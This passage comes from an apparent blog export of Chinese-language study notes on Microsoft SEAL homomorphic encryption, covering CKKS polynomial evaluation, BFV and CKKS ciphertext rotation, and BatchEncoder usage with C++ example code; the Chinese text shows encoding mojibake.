* this leaves us 60-40&#x3D;20 bits of precision before the decimal point, and enough (roughly 10-20 bits) of precision after the decimal point. Since our intermediate primes are 40 bits (in fact, they are very close to 2^40), we can achieve scale stabilization as described above. *&#x2F; double scale &#x3D; pow(2.0, 40); SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; KeyGenerator keygen(context); auto secret_key &#x3D; keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); GaloisKeys galois_keys; keygen.create_galois_keys(galois_keys); Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); CKKSEncoder encoder(context); size_t slot_count &#x3D; encoder.slot_count(); cout &lt;&lt; &quot;Number of slots: &quot; &lt;&lt; slot_count &lt;&lt; endl; vector&lt;double&gt; input; input.reserve(slot_count); &#x2F;&#x2F; ç”³è¯·ç©ºé—´ double curr_point &#x3D; 0; &#x2F;&#x2F;static_cast&lt;double&gt; å°†size_t è½¬æˆæˆdouble åœ¨è¿ç®— double step_size &#x3D; 1.0 &#x2F; (static_cast&lt;double&gt;(slot_count) - 1); &#x2F;&#x2F; for (size_t i &#x3D; 0; i &lt; slot_count; i++) &#123; input.push_back(curr_point); curr_point +&#x3D; step_size; &#125; cout &lt;&lt; &quot;Input vector: &quot; &lt;&lt; endl; print_vector(input,3,7); &#x2F;&#x2F; æ‰“å°vector å‰3 é¡¹å3é¡¹, ä¿ç•™å°æ•°ç‚¹å7ä½ cout &lt;&lt; &quot;Evaluating polynomial PI*x^3 + 0.4x + 1 ...&quot; &lt;&lt; endl; Plaintext plain_coeff3, plain_coeff1, plain_coeff0; &#x2F;&#x2F; ç¼–ç  encoder.encode(3.14159265, scale, plain_coeff3); encoder.encode(0.4, scale, plain_coeff1); encoder.encode(1.0, scale, plain_coeff0); Plaintext x_plain; print_line(__LINE__); cout &lt;&lt; &quot;Encode input vectors.&quot; &lt;&lt; endl; encoder.encode(input, scale, x_plain); &#x2F;&#x2F; åŠ å¯† Ciphertext x1_encrypted; encryptor.encrypt(x_plain, x1_encrypted); &#x2F;* * ä¸ºäº†è®¡ç®—x^3ï¼Œæˆ‘ä»¬é¦–å…ˆè®¡ç®—x^2å¹¶é‡æ–°çº¿æ€§åŒ–ã€‚ç„¶è€Œï¼Œscaleå·²ç»ç°åœ¨å˜æˆäº†2çš„80æ¬¡æ–¹ã€‚ *&#x2F; &#x2F;&#x2F; x^2 Ciphertext x3_encrypted; print_line(__LINE__); cout &lt;&lt; &quot;Compute x^2 and relinearize:&quot; &lt;&lt; endl; evaluator.square(x1_encrypted, x3_encrypted); &#x2F;&#x2F; x3_encrypted &#x3D; x1_encrypted * x1_encrypted evaluator.relinearize_inplace(x3_encrypted, relin_keys); cout &lt;&lt; &quot; + Scale of x^2 before rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; &#x2F;* * ç°åœ¨é‡æ–°è°ƒèŠ‚;rescale * é™¤äº†modulus switch æ–¹æ³•å¤–ï¼Œscale å‡å°‘çš„ç³»æ•°ç­‰äºè¢«è½¬ç§»çš„è´¨æ•°ï¼ˆ40ä½è´¨æ•°ï¼‰ * å› æ­¤, æ–°çš„æ¯”ä¾‹å°ºåº”è¯¥æ¥è¿‘2^40ã€‚ç„¶è€Œï¼Œscale !&#x3D; 2^40 :è¿™æ˜¯å› ä¸º40ä½ç´ æ•°åªæ˜¯æ¥è¿‘2^40ã€‚ * *&#x2F; print_line(__LINE__); cout &lt;&lt; &quot;Rescale x^2.&quot; &lt;&lt; endl; evaluator.rescale_to_next_inplace(x3_encrypted); &#x2F;&#x2F; é‡æ–°è°ƒæ•´scale è§„æ¨¡ cout &lt;&lt; &quot; + Scale of x^2 after rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; &#x2F;* * ç°åœ¨x3_encryptedä¸x1_encryptedå¤„äºä¸åŒçš„çº§åˆ« * è¿™é˜»æ­¢äº†æˆ‘ä»¬ x3_encrypted*x1_encrypted æ¥è®¡ç®—x^3 * å› æ­¤é€šè¿‡modulus switch é“¾ å°†x1_encrypted åˆ‡æ¢åˆ°ä¸x3_encrypted åŒä¸€çº§åˆ«, * ä½†åˆéœ€è¦è®¡ç®—PI* x^3 æ‰€ä»¥ æˆ‘ä»¬å…ˆè®¡ç®— PI*x ç„¶åè°ƒæ•´scale ä»2^80 -&gt; 2^40 * ç„¶ååœ¨è®¡ç®— Pi*x * x^2 * *&#x2F; print_line(__LINE__); &#x2F;&#x2F; PI * x cout &lt;&lt; &quot;Compute and rescale PI*x.&quot; &lt;&lt; endl; Ciphertext x1_encrypted_coeff3; evaluator.multiply_plain(x1_encrypted, plain_coeff3, x1_encrypted_coeff3);&#x2F;&#x2F; x1_encrypted_coeff3 &#x3D; x1_encrypted * plain_coeff3 cout &lt;&lt; &quot; + Scale of PI*x before rescale: &quot; &lt;&lt; log2(x1_encrypted_coeff3.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; evaluator.rescale_to_next_inplace(x1_encrypted_coeff3); cout &lt;&lt; &quot; + Scale of PI*x after rescale: &quot; &lt;&lt; log2(x1_encrypted_coeff3.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; &#x2F;&#x2F;(PI*x)*x^2. print_line(__LINE__); cout &lt;&lt; &quot;Compute, relinearize, and rescale (PI*x)*x^2.&quot; &lt;&lt; endl; evaluator.multiply_inplace(x3_encrypted, x1_encrypted_coeff3); evaluator.relinearize_inplace(x3_encrypted, relin_keys); cout &lt;&lt; &quot; + Scale of PI*x^3 before rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; evaluator.rescale_to_next_inplace(x3_encrypted); cout &lt;&lt; &quot; + Scale of PI*x^3 after rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; &#x2F;&#x2F; 0.4*x print_line(__LINE__); cout &lt;&lt; &quot;Compute and rescale 0.4*x.&quot; &lt;&lt; endl; evaluator.multiply_plain_inplace(x1_encrypted, plain_coeff1); cout &lt;&lt; &quot; + Scale of 0.4*x before rescale: &quot; &lt;&lt; log2(x1_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; evaluator.rescale_to_next_inplace(x1_encrypted); cout &lt;&lt; &quot; + Scale of 0.4*x after rescale: &quot; &lt;&lt; log2(x1_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl; &#x2F;* * ç°åœ¨æˆ‘ä»¬å¸Œæœ›è®¡ç®—è¿™ä¸‰é¡¹çš„å’Œã€‚ç„¶è€Œ,æœ‰ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜æ˜¯: è¿™ä¸‰ä¸ªæœ¯è¯­ä½¿ç”¨çš„åŠ å¯†å‚æ•°éƒ½æ˜¯ä¸åŒæ˜¯ç”±äºæ¨¡æ•°ä»ç¼©æ”¾è½¬æ¢è€Œæ¥ã€‚ åŠ å¯†çš„åŠ æ³•å’Œå‡æ³•è¦æ±‚è¾“å…¥çš„åˆ»åº¦ä¸ºç›¸åŒï¼Œ å¹¶ä¸”åŠ å¯†å‚æ•°(parms_id)åŒ¹é…ã€‚å¦‚æœæœ‰ä¸åŒ¹é…æ—¶ï¼Œæ±‚å€¼å™¨å°†æŠ›å‡ºå¼‚å¸¸ã€‚ *&#x2F; cout &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; &quot;Parameters used by all three terms are different.&quot; &lt;&lt; endl; cout &lt;&lt; &quot; + Modulus chain index for x3_encrypted: &quot; &lt;&lt; context.get_context_data(x3_encrypted.parms_id())-&gt;chain_index() &lt;&lt; endl; cout &lt;&lt; &quot; + Modulus chain index for x1_encrypted: &quot; &lt;&lt; context.get_context_data(x1_encrypted.parms_id())-&gt;chain_index() &lt;&lt; endl; cout &lt;&lt; &quot; + Modulus chain index for plain_coeff0: &quot; &lt;&lt; context.get_context_data(plain_coeff0.parms_id())-&gt;chain_index() &lt;&lt; endl; cout &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; &quot;The exact scales of all three terms are different:&quot; &lt;&lt; endl; ios old_fmt(nullptr); old_fmt.copyfmt(cout); cout &lt;&lt; fixed &lt;&lt; setprecision(10); cout &lt;&lt; &quot; + Exact scale in PI*x^3: &quot; &lt;&lt; x3_encrypted.scale() &lt;&lt; endl; cout &lt;&lt; &quot; + Exact scale in 0.4*x: &quot; &lt;&lt; x1_encrypted.scale() &lt;&lt; endl; cout &lt;&lt; &quot; + Exact scale in 1: &quot; &lt;&lt; plain_coeff0.scale() &lt;&lt; endl; cout &lt;&lt; endl; cout.copyfmt(old_fmt); print_line(__LINE__); cout &lt;&lt; &quot;Normalize scales to 2^40.&quot; &lt;&lt; endl; x3_encrypted.scale() &#x3D; pow(2.0, 40); x1_encrypted.scale() &#x3D; pow(2.0, 40); &#x2F;* * æˆ‘ä»¬è¿˜æœ‰åŠ å¯†å‚æ•°ä¸åŒ¹é…çš„é—®é¢˜ã€‚è¿™æ˜¯å¾ˆå®¹æ˜“çš„é€šè¿‡ä½¿ç”¨modulus switching (no rescaling) æ¥è§£å†³ *&#x2F; print_line(__LINE__); cout &lt;&lt; &quot;Normalize encryption parameters to the lowest level.&quot; &lt;&lt; endl; parms_id_type last_parms_id &#x3D; x3_encrypted.parms_id(); evaluator.mod_switch_to_inplace(x1_encrypted, last_parms_id); evaluator.mod_switch_to_inplace(plain_coeff0, last_parms_id); &#x2F;* åˆ°ç°åœ¨è¿™ä¸‰ç§å¯†æ–‡ç°åœ¨éƒ½æ˜¯å…¼å®¹çš„ï¼Œå¯ä»¥è¿›è¡Œaddè¿ç®—äº† *&#x2F; print_line(__LINE__); cout &lt;&lt; &quot;Compute PI*x^3 + 0.4*x + 1.&quot; &lt;&lt; endl; Ciphertext encrypted_result; evaluator.add(x3_encrypted, x1_encrypted, encrypted_result); evaluator.add_plain_inplace(encrypted_result, plain_coeff0); Plaintext plain_result; print_line(__LINE__); cout &lt;&lt; &quot;Decrypt and decode PI*x^3 + 0.4x + 1.&quot; &lt;&lt; endl; cout &lt;&lt; &quot; + Expected result:&quot; &lt;&lt; endl; vector&lt;double&gt; true_result; for (size_t i &#x3D; 0; i &lt; input.size(); i++) &#123; double x &#x3D; input[i]; true_result.push_back((3.14159265 * x * x + 0.4) * x + 1); &#125; print_vector(true_result, 3, 7); &#x2F;* Decrypt, decode, and print the result. *&#x2F; decryptor.decrypt(encrypted_result, plain_result); vector&lt;double&gt; result; encoder.decode(plain_result, result); cout &lt;&lt; &quot; + Computed result ...... Correct.&quot; &lt;&lt; endl; print_vector(result, 3, 7); return; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"SEALå­¦ä¹ ç¬¬äº”å¤©-Rotaion","slug":"SEALå­¦ä¹ ç¬¬äº”å¤©-rotaion","date":"2021-08-11T14:01:40.000Z","updated":"2021-08-14T14:15:24.772Z","comments":true,"path":"posts/1aba18cf/","link":"","permalink":"https://www.sizaif.com/posts/1aba18cf/","excerpt":"","text":"@auther by sizaif SEAL å­¦ä¹ ç¬¬äº”å¤©ï¼šrotaion @[toc] BFV /* * æ—‹è½¬è¿˜éœ€è¦å¦ä¸€ç§ç±»å‹çš„ç‰¹æ®Šé”® Galois keys */ GaloisKeys galois_keys; keygen.create_galois_keys(galois_keys); ä¸¤ç§åŸºæœ¬æ“ä½œ å‡½æ•°è°ƒç”¨ å‚æ•° è§£é‡Šè¯´æ˜ evaluator.rotate_rows_inplace(encrypted_matrix, 3, galois_keys); Ciphertextï¼Œstepsï¼ŒGaloisKeys å°†çŸ©é˜µå‘å·¦(steps ä¸ºæ­£)å¾ªç¯ç§»åŠ¨3æ­¥ evaluator.rotate_columns_inplace(encrypted_matrix, galois_keys); Ciphertextï¼ŒGaloisKeys å°†çŸ©é˜µè¡Œæ—‹è½¬ ==æ—‹è½¬ä¸æ¶ˆè€—ä»»ä½•å™ªéŸ³é¢„ç®—== æ—‹è½¬åˆ— steps ä¸ºæ­£ å‘å·¦ç§»åŠ¨ steps ä¸ºè´Ÿ å‘å³ç§»åŠ¨ print_line(__LINE__); cout &lt;&lt; \"Rotate rows 3 steps left.\" &lt;&lt; endl; evaluator.rotate_rows_inplace(encrypted_matrix, 3, galois_keys); Plaintext plain_result; cout &lt;&lt; \" + Noise budget after rotation: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_matrix); print_matrix(pod_matrix, row_size); æ—‹è½¬è¡Œ print_line(__LINE__); cout &lt;&lt; \"Rotate columns.\" &lt;&lt; endl; evaluator.rotate_columns_inplace(encrypted_matrix, galois_keys); cout &lt;&lt; \" + Noise budget after rotation: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_matrix); print_matrix(pod_matrix, row_size); CKKS å‡½æ•°è°ƒç”¨ å‚æ•° è§£é‡Šè¯´æ˜ evaluator.rotate_vector(encrypted, 2, galois_keys, rotated); Ciphertextï¼Œstepsï¼ŒGaloisKeysï¼ŒCiphertext å°†encryptedå·¦(stepsä¸ºæ­£)å¾ªç¯ç§»åŠ¨åï¼Œè¾“å‡ºåˆ°rotated code Ciphertext rotated; print_line(__LINE__); cout &lt;&lt; \"Rotate 2 steps left.\" &lt;&lt; endl; evaluator.rotate_vector(encrypted, 2, galois_keys, rotated); cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(rotated, plain); vector&lt;double> result; ckks_encoder.decode(plain, result); print_vector(result, 3, 7); print_line(__LINE__); cout &lt;&lt; \"Rotate 2 steps right.\" &lt;&lt; endl; evaluator.rotate_vector(encrypted, -2, galois_keys, rotated); cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(rotated, plain); ckks_encoder.decode(plain, result); print_vector(result, 3, 7); æºä»£ç  code #include \"examples.h\" using namespace std; using namespace seal; void example_rotation_bfv() &#123; print_example_banner(\"Example: Rotation / Rotation in BFV\"); EncryptionParameters parms(scheme_type::bfv); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); parms.set_plain_modulus(PlainModulus::Batching(poly_modulus_degree, 20)); SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; KeyGenerator keygen(context); SecretKey secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_key; keygen.create_relin_keys(relin_key); Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); BatchEncoder batch_encoder(context); size_t slot_count = batch_encoder.slot_count(); size_t row_size = slot_count / 2; cout &lt;&lt; \"Plaintext matrix row size: \" &lt;&lt; row_size &lt;&lt; endl; vector&lt;uint64_t> pod_matrix(slot_count, 0ULL); pod_matrix[0] = 0ULL; pod_matrix[1] = 1ULL; pod_matrix[2] = 2ULL; pod_matrix[3] = 3ULL; pod_matrix[row_size] = 4ULL; pod_matrix[row_size + 1] = 5ULL; pod_matrix[row_size + 2] = 6ULL; pod_matrix[row_size + 3] = 7ULL; cout &lt;&lt; \"Input plaintext matrix:\" &lt;&lt; endl; print_matrix(pod_matrix, row_size); Plaintext plain_matrix; print_line(__LINE__); cout &lt;&lt; \"Encode and encrypt.\" &lt;&lt; endl; batch_encoder.encode(pod_matrix, plain_matrix); Ciphertext encrypted_matrix; encryptor.encrypt(plain_matrix, encrypted_matrix); cout &lt;&lt; \" + Noise budget in fresh encryption: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; endl; /* * æ—‹è½¬è¿˜éœ€è¦å¦ä¸€ç§ç±»å‹çš„ç‰¹æ®Šé”® Galois keys */ GaloisKeys galois_keys; keygen.create_galois_keys(galois_keys); /* ç°åœ¨å°†çŸ©é˜µè¡Œå‘å·¦å¾ªç¯ç§»åŠ¨3æ­¥, è§£å¯†ã€è§£ç å’Œæ‰“å° */ print_line(__LINE__); cout &lt;&lt; \"Rotate rows 3 steps left.\" &lt;&lt; endl; evaluator.rotate_rows_inplace(encrypted_matrix, 3, galois_keys); Plaintext plain_result; cout &lt;&lt; \" + Noise budget after rotation: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_matrix); print_matrix(pod_matrix, row_size); /* æˆ‘ä»¬ä¹Ÿå¯ä»¥æ—‹è½¬åˆ—, i.e., äº¤æ¢è¡Œ. */ print_line(__LINE__); cout &lt;&lt; \"Rotate columns.\" &lt;&lt; endl; evaluator.rotate_columns_inplace(encrypted_matrix, galois_keys); cout &lt;&lt; \" + Noise budget after rotation: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_matrix); print_matrix(pod_matrix, row_size); /* æœ€åï¼Œæˆ‘ä»¬å°†è¿™äº›è¡Œå‘å³æ—‹è½¬4æ­¥, decrypt, decode, and print. */ print_line(__LINE__); cout &lt;&lt; \"Rotate rows 4 steps right.\" &lt;&lt; endl; evaluator.rotate_rows_inplace(encrypted_matrix, -4, galois_keys); cout &lt;&lt; \" + Noise budget after rotation: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted_matrix) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(encrypted_matrix, plain_result); batch_encoder.decode(plain_result, pod_matrix); print_matrix(pod_matrix, row_size); &#125; void example_rotation_ckks() &#123; print_example_banner(\"Example: Rotation / Rotation in CKKS\"); /* Rotations in the CKKS scheme work very similarly to rotations in BFV. */ EncryptionParameters parms(scheme_type::ckks); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 40, 40, 40, 40, 40 &#125;)); SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; KeyGenerator keygen(context); SecretKey secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); GaloisKeys galois_keys; keygen.create_galois_keys(galois_keys); Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); CKKSEncoder ckks_encoder(context); size_t slot_count = ckks_encoder.slot_count(); cout &lt;&lt; \"Number of slots: \" &lt;&lt; slot_count &lt;&lt; endl; vector&lt;double> input; input.reserve(slot_count); double curr_point = 0; double step_size = 1.0 / (static_cast&lt;double>(slot_count) - 1); for (size_t i = 0; i &lt; slot_count; i++, curr_point += step_size) &#123; input.push_back(curr_point); &#125; cout &lt;&lt; \"Input vector:\" &lt;&lt; endl; print_vector(input, 3, 7); auto scale = pow(2.0, 50); print_line(__LINE__); cout &lt;&lt; \"Encode and encrypt.\" &lt;&lt; endl; Plaintext plain; ckks_encoder.encode(input, scale, plain); Ciphertext encrypted; encryptor.encrypt(plain, encrypted); Ciphertext rotated; print_line(__LINE__); cout &lt;&lt; \"Rotate 2 steps left.\" &lt;&lt; endl; evaluator.rotate_vector(encrypted, 2, galois_keys, rotated); cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(rotated, plain); vector&lt;double> result; ckks_encoder.decode(plain, result); print_vector(result, 3, 7); print_line(__LINE__); cout &lt;&lt; \"Rotate 2 steps right.\" &lt;&lt; endl; evaluator.rotate_vector(encrypted, -2, galois_keys, rotated); cout &lt;&lt; \" + Decrypt and decode ...... Correct.\" &lt;&lt; endl; decryptor.decrypt(rotated, plain); ckks_encoder.decode(plain, result); print_vector(result, 3, 7); &#125; void example_rotation() &#123; print_example_banner(\"Example: Rotation\"); /* Run all rotation examples. */ example_rotation_bfv(); example_rotation_ckks(); &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"SEALå­¦ä¹ ç¬¬äºŒå¤©-Encoderå¤„ç†","slug":"SEALå­¦ä¹ ç¬¬äºŒå¤©-encoderå¤„ç†","date":"2021-08-11T14:01:38.000Z","updated":"2021-08-14T14:15:24.842Z","comments":true,"path":"posts/286653df/","link":"","permalink":"https://www.sizaif.com/posts/286653df/","excerpt":"","text":"@auther by sizaif SEAL å­¦ä¹ ç¬¬äºŒå¤© encoders @[toc] â€‹ BatchEncoder [BatchEncoder] (For BFV scheme only) åœ¨â€œ1 _bfv_basicsã€‚æˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨BFVæ–¹æ¡ˆæ‰§è¡Œä¸€ä¸ªéå¸¸ç®€å•çš„è®¡ç®—ã€‚è®¡ç®—ä»¥æ˜æ–‡æ¨¡ä¸ºå‚æ•°ï¼Œä»…åˆ©ç”¨ä¸€ä¸ªBFVæ˜æ–‡å¤šé¡¹å¼çš„ç³»æ•°ã€‚è¿™ç§æ–¹æ³•æœ‰ä¸¤ä¸ªå€¼å¾—æ³¨æ„çš„é—®é¢˜: (1)å®é™…åº”ç”¨ä¸­ä¸€èˆ¬é‡‡ç”¨æ•´æ•°æˆ–å®æ•°ç®—æ³•ï¼Œè€Œä¸æ˜¯æ¨¡è¿ç®—; (2)æˆ‘ä»¬åªä½¿ç”¨äº†æ˜æ–‡å¤šé¡¹å¼çš„ä¸€ä¸ªç³»æ•°ã€‚è¿™æ˜¯éå¸¸æµªè´¹çš„ï¼Œå› ä¸ºæ˜æ–‡å¤šé¡¹å¼å¾ˆå¤§ï¼Œè€Œä¸”åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½å°†å…¨éƒ¨åŠ å¯†ã€‚ å¯¹äº(1) è‹¥å¢å¤§plain_modulus ï¼Œè™½ç„¶å¯è¡Œï¼Œä½†åŒæ—¶å¢åŠ äº† å™ªå£°é¢„ç®—çš„æ¶ˆè€—(å½“å™ªå£°é¢„ç®—æ¶ˆè€—åˆ°0æ—¶ï¼Œè®¡ç®—ç»“æœæ˜¯ä¸æ­£ç¡®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦éšæ—¶å…³æ³¨å™ªå£°é¢„ç®—)ï¼Œ å°†æ•°æ®ç¼–ç ä¸ºæ˜æ–‡(plaintext) è¿›è¡Œencoder å…è®¸æ›´å¤šçš„è®¡ç®—è€Œæ²¡æœ‰æ•°æ®ç±»å‹æº¢å‡ºï¼Œè¿˜å¯ä»¥å…è®¸ä½¿ç”¨å®Œæ•´çš„æ˜æ–‡å¤šé¡¹å¼ã€‚ è°ƒç”¨ å‚æ•° è§£é‡Šè¯´æ˜ BatchEncoder batch_encoder(context); SEALContext å£°æ˜ä¸€ä¸ªæ‰¹å¤„ç†ç±» batch_encoder.encode(pod_matrix, plain_matrix); VectorPlaintext å°†ä¸€ä¸ªvectoræ‰¹é‡ç¼–ç æˆæˆæ˜æ–‡Plaintext batch_encoder.decode(plain_matrix, pod_result); Plaintext,Vector å°†ä¸€ä¸ªæ˜æ–‡Plaintextå¤„ç†è§£ç æˆvector /* è®¾Nä¸ºpoly_modulus_degreeï¼ŒTä¸ºplain_modulusã€‚æ‰¹å¤„ç†å…è®¸BFVæ˜æ–‡å¤šé¡¹å¼è¢«è§†ä¸º2Ã—(N/2)çŸ©é˜µï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæ¨¡Tæ•´æ•°ã€‚åœ¨çŸ©é˜µè§†å›¾ä¸­ï¼ŒåŠ å¯†æ“ä½œåœ¨åŠ å¯†çŸ©é˜µä¸Šé€ä¸ªæ‰§è¡Œelement-wiseï¼Œå…è®¸ç”¨æˆ·åœ¨å®Œå…¨å‘é‡åŒ–è®¡ç®—ä¸­è·å¾—å‡ ä¸ªæ•°é‡çº§çš„é€Ÿåº¦æå‡ã€‚å› æ­¤ï¼Œé™¤äº†æœ€ç®€å•çš„è®¡ç®—ä¹‹å¤–ï¼Œæ‰¹å¤„ç†åº”è¯¥æ˜¯é¦–é€‰çš„æ–¹æ³•ã€‚ä½¿ç”¨BFVæ—¶ï¼Œå¦‚æœä½¿ç”¨å¾—å½“ï¼Œå®ç°çš„æ€§èƒ½å°†è¶…è¿‡ä½¿ç”¨IntegerEncoderå®Œæˆçš„ä»»ä½•å·¥ä½œã€‚ */ EncryptionParameters parms(scheme_type::bfv); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); è¦å¯ç”¨æ‰¹å¤„ç†ï¼Œæˆ‘ä»¬éœ€è¦å°†plain_modulusè®¾ç½®ä¸ºä¸€ä¸ªç´ æ•°ï¼Œç­‰äº1æ¨¡2* poly_modulus_degreesã€‚Microsoft SEALæä¾›äº†ä¸€ä¸ªåŠ©æ‰‹ æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªè´¨æ•°çš„æ–¹æ³•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª20ä½ç´ æ•°æ”¯æŒæ‰¹å¤„ç†ã€‚ é€šè¿‡CoeffModulus::BFVDefault(poly_modulus_degree) äº§å‡ºä¸€ä¸ªç´ æ•° parms.set_plain_modulus(PlainModulus::Batching(poly_modulus_degree, 20)); SEALContext context(parms);// å£°æ˜å®Œcontextåç±»ï¼Œåå°±å¯ä»¥å¼€å§‹ä½¿ç”¨äº† // æ£€æµ‹æ˜¯å¦æˆåŠŸå¯ç”¨ auto qualifiers = context.first_context_data()->qualifiers(); cout &lt;&lt; \"Batching enabled: \" &lt;&lt; boolalpha &lt;&lt; qualifiers.using_batching &lt;&lt; endl; æ‰¹å¤„ç†â€˜slotsâ€™çš„æ€»æ•°ç­‰äºpoly_modulus_degree, Nï¼Œè¿™äº›â€™slotsâ€™è¢«ç»„ç»‡æˆ2Ã—(N/2)çŸ©é˜µï¼Œå¯ä»¥è¢«åŠ å¯†å’Œè®¡ç®—ã€‚æ¯ä¸ªslotå«ä¸€ä¸ªæ•´æ•° MOD plain_modulusã€‚ 2Ã—(N/2) size_t slot_count = batch_encoder.slot_count(); size_t row_size = slot_count / 2; cout &lt;&lt; \"Plaintext matrix slot_count size: \" &lt;&lt; slot_count &lt;&lt; endl; cout &lt;&lt; \"Plaintext matrix row size: \" &lt;&lt; row_size &lt;&lt; endl; /* * å£°æ˜ä¸€ä¸ªvectorï¼Œé•¿åº¦ä¸ºslot_countï¼Œ é»˜ä¸º 0 * å½¢å¼ä¸ºï¼š 2*(slot_count/2) çš„äºŒç»´çŸ©é˜µ * [0...............row_size] * [row_size......slot_count] */ vector&lt;uint64_t> pod_matrix(slot_count, 0ULL); //èµ‹å€¼ pod_matrix[0] = 0ULL; pod_matrix[1] = 1ULL; pod_matrix[2] = 2ULL; pod_matrix[3] = 3ULL; pod_matrix[row_size] = 4ULL; pod_matrix[row_size + 1] = 5ULL; pod_matrix[row_size + 2] = 6ULL; pod_matrix[row_size + 3] = 7ULL; cout &lt;&lt; \"Input plaintext matrix:\" &lt;&lt; endl; /* * è¿™ä¸ªprint_matrixä¸ä¼šæ‰“å°çŸ©é˜µçš„æ¯ä¸€åˆ—,åªæ‰“å°æ¯ä¸€è¡Œçš„å‰5ä¸ªå’Œæœ€å5ä¸ª * [ 0, 1, 2, 3, 0, 0, ..., 0 ] * [ 4, 5, 6, 7, 0, 0, ..., 0 ] */ print_matrix(pod_matrix, row_size); encode 